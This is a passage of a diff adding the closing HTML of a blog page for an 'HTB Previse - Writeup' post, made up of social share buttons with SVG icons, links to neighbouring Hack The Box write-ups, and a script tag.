1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-machine-previse%2f;title=HTB%20Previse%20-%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=HTB%20Previse%20-%20Writeup%20https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-machine-previse%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-machine-previse%2f&amp;t=HTB%20Previse%20-%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HTB%20Previse%20-%20Writeup&amp;url=https%3a%2f%2fharshitm98.github.io%2fposts%2fhtb-machine-previse%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+        </div>
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://harshitm98.github.io/posts/htb-challenge-templated/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">HTB Templated - Writeup</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="https://harshitm98.github.io/posts/htb-machine-cap/">
+                    <span class="button__text">HTB Cap - Writeup</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.72f3cdb1757e654c5aa1329a4269ea6a8d7b37513de3b9d54d7a5ca25573fb3a64f872d6c36cdb2acf759068fd27157cda3ac3827a42378d38946a025e58b6e6.js" integrity="sha512-cvPNsXV&#43;ZUxaoTKaQmnqao17N1E947nVTXpcolVz&#43;zpk&#43;HLWw2zbKs91kGj9JxV82jrDgnpCN404lGoCXli25g=="></script>
+
+
+
+    </body>
+</html>
